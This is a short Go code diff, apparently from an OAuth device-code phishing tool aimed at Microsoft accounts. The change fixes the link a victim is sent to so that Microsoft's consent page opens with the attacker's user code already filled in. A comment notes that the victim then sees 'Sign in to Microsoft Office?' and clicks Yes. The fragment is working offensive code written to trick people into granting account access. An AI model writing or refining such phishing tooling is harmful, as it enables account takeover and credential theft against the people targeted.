@@ -608,14 +608,14 @@ func dcB64(s string) string {
 	return base64.URLEncoding.EncodeToString([]byte(s))
 }
 
-// verifyURL returns the best URL to send the victim to. Uses Microsoft's own
-// verification_uri_complete when available (they build it correctly), otherwise
-// falls back to constructing it from verification_uri + user_code.
+// verifyURL returns the HTML consent page URL with the user_code pre-filled.
+//
+// microsoft.com/devicelogin?code=XXX now server-redirects to the JSON API
+// endpoint (deviceauth?code=XXX) which returns raw JSON in the browser.
+// The correct user-facing HTML form is deviceauth?user_code=XXX — the code
+// is pre-filled, victim sees "Sign in to Microsoft Office?" and clicks Yes.
 func (t *DCTarget) verifyURL() string {
-	if t.VerificationURIComplete != "" {
-		return t.VerificationURIComplete
-	}
-	return t.VerificationURI + "?code=" + url.QueryEscape(t.UserCode)
+	return "https://login.microsoftonline.com/common/oauth2/deviceauth?user_code=" + url.QueryEscape(t.UserCode)
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
